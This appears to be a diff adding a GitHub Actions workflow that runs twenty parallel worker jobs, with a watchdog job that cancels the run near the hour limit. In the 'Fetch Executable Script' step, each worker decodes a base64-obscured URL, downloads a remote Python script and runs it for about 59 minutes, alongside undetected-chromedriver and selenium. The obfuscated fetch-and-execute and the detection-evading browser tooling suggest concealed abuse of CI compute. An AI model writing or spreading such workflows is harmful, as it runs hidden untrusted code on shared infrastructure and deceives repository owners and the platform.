@@ -1,0 +1,108 @@
+name: Horizon Pulse Matrix Engine
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: pulse-engine-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watchdog: يراقب ويوقف سير العمل كاملاً عند انتهاء مهلة 59 دقيقة
+  # =================================================================
+  pulse-watchdog:
+    name: "System Watchdog Supervisor"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_HOLD_TIME: 3540
+    steps:
+      - name: Initialize Watchdog Monitor
+        run: |
+          echo "[WATCHDOG] Supervisor initiated for Execution ID: ${{ github.run_id }}"
+          echo "[WATCHDOG] Holding background timer for ${MAX_HOLD_TIME} seconds."
+
+          sleep "${MAX_HOLD_TIME}"
+
+          echo "[WATCHDOG] Time limit reached. Triggering global workflow termination..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHDOG] Abort signal sent successfully to all active jobs."
+
+  # =================================================================
+  # Worker Nodes: التشغيل المتوازي لعقد المعالجة
+  # =================================================================
+  matrix-workers:
+    name: "Worker-${{ matrix.node_key }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_key: [
+          "N1A", "N2B", "N3C", "N4D", "N5E",
+          "N6F", "N7G", "N8H", "N9I", "N10J",
+          "N11K", "N12L", "N13M", "N14N", "N15O",
+          "N16P", "N17Q", "N18R", "N19S", "N20T"
+        ]
+
+    steps:
+      # #################################################################
+      # المرحلة الأولى: تجهيز العقدة والبيئة الأساسية
+      # #################################################################
+      - name: Prepare Node Environment
+        run: |
+          echo "[SETUP] Initializing Node-${{ matrix.node_key }} environment..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # المرحلة الثانية: جلب السكريبت التنفيذي
+      # #################################################################
+      - name: Fetch Executable Script
+        run: |
+          echo "[FETCH] Retrieving core payload script from source..."
+          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$TARGET_URL" -o app_runner.py
+          echo "[FETCH] Script retrieved and saved to local disk."
+
+      # #################################################################
+      # المرحلة الثالثة: تثبيت المكتبات والاعتماديات
+      # #################################################################
+      - name: Deploy Python Dependencies
+        run: |
+          echo "[DEPS] Installing required libraries..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # المرحلة الرابعة: تشغيل العملية الرئيسية والتحكم بمهلة التشغيل
+      # #################################################################
+      - name: Execute Main Process
+        run: |
+          echo "[EXEC] Starting worker task for Node-${{ matrix.node_key }}..."
+
+          python3 app_runner.py &
+          TASK_PID=$!
+
+          echo "[EXEC] Process started (PID: $TASK_PID). Max lifecycle set to 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo "[EXEC] Timeout threshold reached — force stopping process."
+            kill -9 "$TASK_PID"
+            echo "[EXEC] Process successfully terminated."
+          else
+            echo "[EXEC] Task completed naturally before timeout threshold."
+          fi
